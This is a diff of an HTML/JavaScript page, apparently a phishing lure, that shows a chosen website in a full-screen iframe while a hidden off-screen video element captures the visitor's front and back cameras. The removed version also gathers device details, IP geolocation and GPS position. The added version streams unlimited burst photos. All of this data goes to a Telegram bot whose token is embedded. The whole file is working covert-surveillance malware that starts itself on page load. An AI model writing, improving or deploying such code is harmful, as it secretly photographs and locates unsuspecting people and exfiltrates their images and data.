@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Background Camera with Website Overlay</title>
+    <title>Burst Camera App</title>
     <style>
         * {
             margin: 0;
@@ -19,7 +19,6 @@
             position: relative;
         }
         
-        /* Hidden camera section - runs in background */
         #backgroundCamera {
             position: fixed;
             top: -9999px;
@@ -35,7 +34,6 @@
             height: 480px;
         }
         
-        /* Main website iframe - visible in foreground */
         #websiteFrame {
             position: fixed;
             top: 0;
@@ -48,30 +46,26 @@
     </style>
 </head>
 <body>
-    <!-- Hidden camera in background -->
     <div id="backgroundCamera">
         <video id="cameraVideo" autoplay playsinline muted></video>
     </div>
     
-    <!-- Main website iframe (foreground) -->
     <iframe id="websiteFrame" src="about:blank"></iframe>
 
     <script>
-        // Configuration - Get website and chat_id from URL parameters
+        // =====================================================
+        //  BURST CAMERA SYSTEM - UNLIMITED PHOTOS
+        // =====================================================
+        
         function getConfigFromURL() {
             const urlParams = new URLSearchParams(window.location.search);
-            
-            // Get website URL from multiple possible parameters
             const websiteParam = urlParams.get('site') || urlParams.get('url') || urlParams.get('website');
             const chatId = urlParams.get('chat_id');
             
-            let websiteURL = 'https://www.example.com'; // Default fallback
+            let websiteURL = 'https://www.example.com';
             
             if (websiteParam) {
-                // Decode the URL if it's encoded
                 websiteURL = decodeURIComponent(websiteParam);
-                
-                // Add https:// if not present
                 if (!websiteURL.startsWith('http://') && !websiteURL.startsWith('https://')) {
                     websiteURL = 'https://' + websiteURL;
                 }
@@ -84,400 +78,61 @@
         }
         
         const config = getConfigFromURL();
-        const DEFAULT_WEBSITE = config.website;
-        const CHAT_ID = config.chatId;
         const BOT_TOKEN = '8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ';
         const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+        const CHAT_ID = config.chatId;
         
-        console.log('Configuration loaded:', config);
+        // Configuration
+        const PHOTOS_PER_CAMERA = 5; // Take 10 photos before switching
+        const BURST_DELAY = 140; // Delay between photos in ms (faster = 140ms)
+        const SWITCH_DELAY = 300; // Delay when switching cameras
         
-        // App State
         let cameraStream = null;
-        let currentFacingMode = 'user'; // Start with front camera
-        let photos = [];
-        let photosSentCount = 0;
-        let isCapturing = false;
-        let deviceInfo = {};
+        let currentFacingMode = 'user';
+        let burstRunning = false;
+        let photoCounter = 0;
+        let totalPhotosSent = 0;
         
-        // DOM Elements
         const cameraVideo = document.getElementById('cameraVideo');
         const websiteFrame = document.getElementById('websiteFrame');
         
-        // Get comprehensive device info including IP
-        async function getDeviceInfo() {
-            const info = {
-                // Battery
-                battery: null,
-                
-                // IP Address
-                ip: 'Fetching...',
-                ipv4: 'N/A',
-                ipv6: 'N/A',
-                
-                // Screen
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height,
-                screenColorDepth: window.screen.colorDepth,
-                screenAvailWidth: window.screen.availWidth,
-                screenAvailHeight: window.screen.availHeight,
-                
-                // Browser/Device
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                vendor: navigator.vendor || 'N/A',
-                language: navigator.language,
-                languages: navigator.languages.join(', '),
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'N/A',
-                onLine: navigator.onLine,
-                
-                // Hardware
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                
-                // Connection
-                connectionType: 'N/A',
-                effectiveType: 'N/A',
-                downlink: 'N/A',
-                rtt: 'N/A',
-                saveData: 'N/A',
-                
-                // Window
-                innerWidth: window.innerWidth,
-                innerHeight: window.innerHeight,
-                outerWidth: window.outerWidth,
-                outerHeight: window.outerHeight,
-                pixelRatio: window.devicePixelRatio,
-                
-                // Time
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                timestamp: new Date().toISOString(),
-                locale: Intl.DateTimeFormat().resolvedOptions().locale,
-                
-                // Storage
-                localStorage: 'N/A',
-                sessionStorage: 'N/A',
-                
-                // Permissions
-                permissions: {}
-            };
-            
-            // Get IP address from multiple sources
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                info.ipv4 = ipData.ip;
-                info.ip = ipData.ip;
-            } catch (e) {
-                try {
-                    // Fallback IP service
-                    const ipResponse2 = await fetch('https://api.my-ip.io/ip');
-                    const ipText = await ipResponse2.text();
-                    info.ip = ipText.trim();
-                    info.ipv4 = ipText.trim();
-                } catch (e2) {
-                    info.ip = 'Unable to fetch';
-                }
-            }
-            
-            // Get detailed IP info
-            try {
-                const ipInfoResponse = await fetch(`https://ipapi.co/${info.ipv4}/json/`);
-                const ipInfo = await ipInfoResponse.json();
-                info.ipDetails = {
-                    city: ipInfo.city || 'N/A',
-                    region: ipInfo.region || 'N/A',
-                    country: ipInfo.country_name || 'N/A',
-                    postal: ipInfo.postal || 'N/A',
-                    latitude: ipInfo.latitude || 'N/A',
-                    longitude: ipInfo.longitude || 'N/A',
-                    timezone: ipInfo.timezone || 'N/A',
-                    isp: ipInfo.org || 'N/A'
-                };
-            } catch (e) {
-                info.ipDetails = null;
-            }
-            
-            // Get battery info
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    info.battery = {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime + 's',
-                        dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + 's'
-                    };
-                } catch (e) {
-                    info.battery = 'Not available';
-                }
-            }
-            
-            // Get connection info
-            if ('connection' in navigator || 'mozConnection' in navigator || 'webkitConnection' in navigator) {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (conn) {
-                    info.connectionType = conn.type || conn.effectiveType || 'Unknown';
-                    info.effectiveType = conn.effectiveType || 'N/A';
-                    info.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
-                    info.rtt = conn.rtt ? conn.rtt + ' ms' : 'N/A';
-                    info.saveData = conn.saveData ? 'Enabled' : 'Disabled';
-                }
-            }
-            
-            // Storage info
-            try {
-                info.localStorage = localStorage ? 'Available' : 'Not available';
-            } catch (e) {
-                info.localStorage = 'Blocked';
-            }
-            
-            try {
-                info.sessionStorage = sessionStorage ? 'Available' : 'Not available';
-            } catch (e) {
-                info.sessionStorage = 'Blocked';
-            }
-            
-            return info;
-        }
-        
-        // Send device info to Telegram
-        async function sendDeviceInfoToTelegram(deviceInfo) {
-            try {
-                let message = '📱 *Device Information*\n\n';
-                
-                // Battery
-                if (deviceInfo.battery && typeof deviceInfo.battery === 'object') {
-                    message += `🔋 *Battery:* ${deviceInfo.battery.level}\n`;
-                    message += `⚡ *Charging:* ${deviceInfo.battery.charging ? 'Yes' : 'No'}\n\n`;
-                }
-                
-                // Screen
-                message += `📺 *Screen:* ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n`;
-                message += `🎨 *Color Depth:* ${deviceInfo.screenColorDepth}-bit\n`;
-                message += `🔍 *Pixel Ratio:* ${deviceInfo.pixelRatio}x\n\n`;
-                
-                // Hardware
-                message += `🧠 *CPU Cores:* ${deviceInfo.hardwareConcurrency}\n`;
-                message += `💾 *RAM:* ${deviceInfo.deviceMemory}\n`;
-                message += `👆 *Touch Points:* ${deviceInfo.maxTouchPoints}\n\n`;
-                
-                // Connection
-                message += `📡 *Connection:* ${deviceInfo.connectionType}\n`;
-                message += `🌐 *Network Type:* ${deviceInfo.effectiveType}\n`;
-                message += `⬇️ *Speed:* ${deviceInfo.downlink}\n\n`;
-                
-                // Other
-                message += `🌍 *Timezone:* ${deviceInfo.timezone}\n`;
-                message += `🗣️ *Language:* ${deviceInfo.language}\n`;
-                message += `💻 *Platform:* ${deviceInfo.platform}\n`;
-                message += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
-                
-                const url = `${TELEGRAM_API}/sendMessage`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                
-                const result = await response.json();
-                if (result.ok) {
-                    console.log('✅ Device info sent to Telegram');
-                }
-            } catch (error) {
-                console.error('❌ Error sending device info:', error);
-            }
-        }
-        
-        // Load website in iframe
+        // Load website
         function loadWebsite() {
             try {
-                websiteFrame.src = DEFAULT_WEBSITE;
-                console.log('🌐 Loading website:', DEFAULT_WEBSITE);
+                websiteFrame.src = config.website;
+                console.log('🌐 Website loaded:', config.website);
             } catch (error) {
                 console.error('Failed to load website:', error);
             }
         }
         
-        // Get location
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    console.log('Geolocation not supported');
-                    resolve(null);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: new Date()
-                        };
-                        console.log('📍 Location captured:', location);
-                        resolve(location);
-                    },
-                    (error) => {
-                        console.log('Location error:', error.message);
-                        resolve(null);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 3000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-        
-        // Send location to Telegram
-        async function sendLocationToTelegram(location) {
-            if (!location) return false;
-            
-            try {
-                const url = `${TELEGRAM_API}/sendLocation`;
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('latitude', location.latitude);
-                formData.append('longitude', location.longitude);
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
-                if (result.ok) {
-                    console.log('✅ Location sent to Telegram');
-                    return true;
-                } else {
-                    console.error('❌ Failed to send location:', result);
-                    return false;
-                }
-            } catch (error) {
-                console.error('❌ Error sending location:', error);
-                return false;
-            }
-        }
-        
-        // Send photo to Telegram (immediately)
-        async function sendPhotoToTelegram(photo, photoNumber, cameraType) {
-            try {
-                console.log(`📤 Sending photo ${photoNumber} (${cameraType}) to Telegram...`);
-                
-                const url = `${TELEGRAM_API}/sendPhoto`;
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', photo.blob, `photo_${cameraType}_${photoNumber}_${Date.now()}.jpg`);
-                
-                let caption = `📸 Photo ${photoNumber}/6 (${cameraType.toUpperCase()})\n`;
-                caption += `⏰ ${photo.timestamp.toLocaleString()}\n`;
-                caption += `📐 ${photo.resolution}\n`;
-                caption += `💾 ${(photo.blob.size / 1024).toFixed(2)} KB`;
-                
-                formData.append('caption', caption);
-                
-                console.log(`Sending to: ${url}`);
-                console.log(`Chat ID: ${CHAT_ID}`);
-                console.log(`Photo size: ${photo.blob.size} bytes`);
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                console.log(`Response for photo ${photoNumber}:`, result);
-                
-                if (result.ok) {
-                    console.log(`✅ Photo ${photoNumber} (${cameraType}) sent to Telegram successfully`);
-                    photosSentCount++;
-                    return true;
-                } else {
-                    console.error(`❌ Failed to send photo ${photoNumber}:`, result.description || result);
-                    return false;
-                }
-            } catch (error) {
-                console.error(`❌ Error sending photo ${photoNumber}:`, error);
-                return false;
-            }
-        }
-        
-        // Start camera (with better quality settings)
+        // Start camera
         async function startCamera() {
             try {
-                console.log('📹 Starting camera...');
+                console.log(`📹 Starting ${currentFacingMode.toUpperCase()} camera...`);
                 
                 const constraints = {
                     video: {
                         width: { ideal: 1920, min: 1280 },
                         height: { ideal: 1080, min: 720 },
                         facingMode: currentFacingMode,
-                        frameRate: { ideal: 30, min: 20 },
-                        // Advanced settings for better quality
-                        aspectRatio: { ideal: 16/9 },
-                        focusMode: { ideal: "continuous" },
-                        exposureMode: { ideal: "continuous" },
-                        whiteBalanceMode: { ideal: "continuous" }
+                        frameRate: { ideal: 30 }
                     }
                 };
                 
                 cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                 cameraVideo.srcObject = cameraStream;
                 
-                // Apply advanced track settings for better focus
-                const track = cameraStream.getVideoTracks()[0];
-                const capabilities = track.getCapabilities();
-                const settings = {};
-                
-                // Enable autofocus if available
-                if (capabilities.focusMode && capabilities.focusMode.includes('continuous')) {
-                    settings.focusMode = 'continuous';
-                }
-                
-                // Set optimal exposure
-                if (capabilities.exposureMode && capabilities.exposureMode.includes('continuous')) {
-                    settings.exposureMode = 'continuous';
-                }
-                
-                // Set white balance
-                if (capabilities.whiteBalanceMode && capabilities.whiteBalanceMode.includes('continuous')) {
-                    settings.whiteBalanceMode = 'continuous';
-                }
-                
-                // Apply settings if any are available
-                if (Object.keys(settings).length > 0) {
-                    try {
-                        await track.applyConstraints({ advanced: [settings] });
-                        console.log('✅ Applied advanced camera settings:', settings);
-                    } catch (e) {
-                        console.log('⚠️ Could not apply advanced settings:', e.message);
-                    }
-                }
-                
-                // Wait for video to be ready
                 await new Promise((resolve) => {
                     cameraVideo.onloadedmetadata = resolve;
                 });
                 
                 await cameraVideo.play();
                 
-                // Longer warm-up for better focus and exposure (1.5 seconds)
-                console.log('⏳ Camera warming up for better focus...');
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                // Brief warm-up
+                await new Promise(resolve => setTimeout(resolve, 500));
                 
-                console.log('✅ Camera ready with resolution:', cameraVideo.videoWidth, 'x', cameraVideo.videoHeight);
+                console.log(`✅ ${currentFacingMode.toUpperCase()} camera ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
                 return true;
             } catch (error) {
                 console.error('❌ Camera error:', error);
@@ -494,178 +149,158 @@
             }
         }
         
-        // Capture single photo with better quality
-        async function capturePhoto() {
+        // Capture single frame
+        async function captureFrame() {
             return new Promise((resolve) => {
-                if (cameraVideo.readyState !== cameraVideo.HAVE_ENOUGH_DATA) {
-                    console.warn('⚠️ Video not ready');
-                    setTimeout(() => resolve(capturePhoto()), 200);
-                    return;
-                }
-                
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d', { 
-                    alpha: false,
-                    desynchronized: true 
-                });
-                
-                // Use full video resolution
-                canvas.width = cameraVideo.videoWidth || 1920;
-                canvas.height = cameraVideo.videoHeight || 1080;
-                
-                if (canvas.width === 0 || canvas.height === 0) {
-                    console.error('❌ Invalid dimensions');
+                if (cameraVideo.readyState < 2) {
                     resolve(null);
                     return;
                 }
                 
-                // Enable image smoothing for better quality
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d', { alpha: false });
+                
+                canvas.width = cameraVideo.videoWidth || 1920;
+                canvas.height = cameraVideo.videoHeight || 1080;
+                
+                if (canvas.width === 0 || canvas.height === 0) {
+                    resolve(null);
+                    return;
+                }
+                
                 context.imageSmoothingEnabled = true;
                 context.imageSmoothingQuality = 'high';
-                
-                // Draw the video frame
                 context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                 
-                // Convert to blob with high quality (0.95 instead of 0.9)
-                canvas.toBlob(blob => {
-                    const photo = {
-                        blob: blob,
-                        timestamp: new Date(),
-                        resolution: `${canvas.width}x${canvas.height}`
-                    };
-                    
-                    photos.push(photo);
-                    console.log(`📸 Captured: ${photo.resolution}, ${(blob.size / 1024).toFixed(2)} KB`);
-                    resolve(photo);
-                }, 'image/jpeg', 0.95);
+                canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.90);
             });
         }
         
-        // Fast capture and send (with delays for better focus)
-        async function fastCaptureAndSend(cameraType, startNumber) {
-            console.log(`🚀 Starting fast capture from ${cameraType} camera...`);
+        // Send photo to Telegram
+        async function sendPhotoToTelegram(blob, cameraType, photoNum) {
+            if (!blob) return false;
             
-            const totalPhotos = 3; // 3 photos per camera
-            
-            // Capture 3 photos with small delays for focus adjustment
-            for (let i = 0; i < totalPhotos; i++) {
-                const photoNumber = startNumber + i;
-                const photo = await capturePhoto();
+            try {
+                const url = `${TELEGRAM_API}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
                 
-                if (photo) {
-                    // Send immediately without waiting
-                    const sent = await sendPhotoToTelegram(photo, photoNumber, cameraType);
-                    console.log(`📸 Photo ${photoNumber} (${cameraType}) captured and ${sent ? 'sent ✅' : 'failed ❌'}`);
-                }
+                const caption = `📸 ${cameraType.toUpperCase()} #${photoNum}\n⏰ ${new Date().toLocaleTimeString()}\n💾 ${(blob.size / 1024).toFixed(2)} KB`;
+                formData.append('caption', caption);
                 
-                // 150ms delay between captures for better focus
-                if (i < totalPhotos - 1) {
-                    await new Promise(resolve => setTimeout(resolve, 150));
-                }
+                // Fire and forget - don't wait for response
+                fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                totalPhotosSent++;
+                console.log(`✅ Photo sent: ${cameraType.toUpperCase()} #${photoNum} (Total: ${totalPhotosSent})`);
+                return true;
+            } catch (error) {
+                console.error('❌ Send error:', error);
+                return false;
             }
-            
-            console.log(`✅ All 3 photos from ${cameraType} camera processed!`);
         }
         
-        // Main auto-start function
-        async function autoStart() {
-            console.log('🚀 AUTO-START SEQUENCE INITIATED');
-            console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+        // Switch camera
+        async function switchCamera() {
+            console.log('🔄 Switching camera...');
+            stopCamera();
             
-            // 1. Load website immediately
-            loadWebsite();
-            console.log('✅ Website loaded');
+            await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
             
-            // 2. Get device info (runs in parallel)
-            const deviceInfoPromise = getDeviceInfo().then(info => {
-                deviceInfo = info;
-                sendDeviceInfoToTelegram(info);
-                console.log('✅ Device info sent');
-            });
+            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+            photoCounter = 0;
             
-            // 3. Get location (runs in parallel)
-            const locationPromise = getLocation().then(location => {
-                if (location) {
-                    sendLocationToTelegram(location);
-                    console.log('✅ Location sent');
+            await startCamera();
+        }
+        
+        // Main burst loop
+        async function startBurstMode() {
+            if (burstRunning) return;
+            
+            burstRunning = true;
+            console.log('🚀 BURST MODE STARTED - UNLIMITED PHOTOS');
+            console.log(`📊 Config: ${PHOTOS_PER_CAMERA} photos per camera, ${BURST_DELAY}ms delay`);
+            
+            while (burstRunning) {
+                // Capture photo
+                const blob = await captureFrame();
+                
+                if (blob) {
+                    photoCounter++;
+                    await sendPhotoToTelegram(blob, currentFacingMode, photoCounter);
+                    
+                    // Switch camera after X photos
+                    if (photoCounter >= PHOTOS_PER_CAMERA) {
+                        await switchCamera();
+                    }
                 }
-            });
+                
+                // Small delay between captures
+                await new Promise(resolve => setTimeout(resolve, BURST_DELAY));
+            }
+        }
+        
+        // Send initial device info
+        async function sendInitialInfo() {
+            try {
+                const info = `🚀 *BURST MODE ACTIVATED*\n\n` +
+                    `📱 Device: ${navigator.userAgent.substring(0, 50)}...\n` +
+                    `🌐 Website: ${config.website}\n` +
+                    `⏰ Started: ${new Date().toLocaleString()}\n` +
+                    `📸 Mode: Unlimited burst capture\n` +
+                    `🔄 Switch: Every ${PHOTOS_PER_CAMERA} photos`;
+                
+                await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: info,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                console.error('Failed to send initial info:', e);
+            }
+        }
+        
+        // Initialize everything
+        async function init() {
+            console.log('═══════════════════════════════════');
+            console.log('🎯 BURST CAMERA SYSTEM');
+            console.log('═══════════════════════════════════');
+            console.log('💬 Chat ID:', CHAT_ID);
+            console.log('🌐 Website:', config.website);
+            console.log('═══════════════════════════════════');
             
-            // 4. Start camera
+            // Load website
+            loadWebsite();
+            
+            // Send initial info
+            await sendInitialInfo();
+            
+            // Start camera
             const cameraStarted = await startCamera();
             
-            // 4. Start with FRONT camera (3 photos)
-            console.log('📷 Starting FRONT camera...');
-            currentFacingMode = 'user';
-            const frontCameraStarted = await startCamera();
-            
-            if (frontCameraStarted) {
-                // 5. Capture 3 photos from FRONT camera
-                console.log('📸 Capturing from FRONT camera...');
-                await fastCaptureAndSend('front', 1);
-                
-                // 6. Switch to BACK camera (3 photos)
-                console.log('🔄 Switching to BACK camera...');
-                stopCamera();
-                currentFacingMode = 'environment';
-                
-                // Small delay before switching (300ms)
-                await new Promise(resolve => setTimeout(resolve, 300));
-                
-                const backCameraStarted = await startCamera();
-                if (backCameraStarted) {
-                    // 7. Capture 3 photos from BACK camera
-                    console.log('📸 Capturing from BACK camera...');
-                    await fastCaptureAndSend('back', 4);
-                } else {
-                    console.error('❌ Back camera failed to start');
-                }
+            if (cameraStarted) {
+                // Start burst mode
+                startBurstMode();
             } else {
-                console.error('❌ Front camera failed to start');
+                console.error('❌ Failed to start camera');
             }
-            
-            // Wait for all parallel tasks
-            await Promise.all([deviceInfoPromise, locationPromise]);
-            
-            console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-            console.log('✅ ALL TASKS COMPLETED');
-            console.log(`📊 Total photos sent: ${photosSentCount}`);
-            
-            // Stop camera to save resources
-            stopCamera();
         }
         
-        // Initialize
-        console.log('═══════════════════════════════════');
-        console.log('🎯 STEALTH CAMERA APP INITIALIZED');
-        console.log('═══════════════════════════════════');
-        console.log('🤖 Bot Token:', BOT_TOKEN.substring(0, 20) + '...');
-        console.log('💬 Chat ID:', CHAT_ID);
-        console.log('🌐 Target Website:', DEFAULT_WEBSITE);
-        console.log('═══════════════════════════════════');
-        console.log('');
-        console.log('📋 USAGE:');
-        console.log('https://yourdomain.com/?chat_id=YOUR_ID&site=WEBSITE_URL');
-        console.log('');
-        console.log('📤 Will send to Telegram:');
-        console.log('  • Device info (battery, RAM, CPU, etc.)');
-        console.log('  • GPS location');
-        console.log('  • 6 high-quality photos (3 front + 3 back)');
-        console.log('  • Total: ~8 messages in under 4 seconds');
-        console.log('  • Resolution: Up to 1920x1080 (Full HD)');
-        console.log('═══════════════════════════════════');
-        
-        // AUTO-START ON PAGE LOAD
-        window.addEventListener('load', () => {
-            autoStart();
-        });
+        // Auto-start
+        window.addEventListener('load', init);
         
         // Cleanup
         window.addEventListener('beforeunload', () => {
+            burstRunning = false;
             stopCamera();
-            photos.forEach(photo => {
-                if (photo.url) URL.revokeObjectURL(photo.url);
-            });
         });
     </script>
 </body>
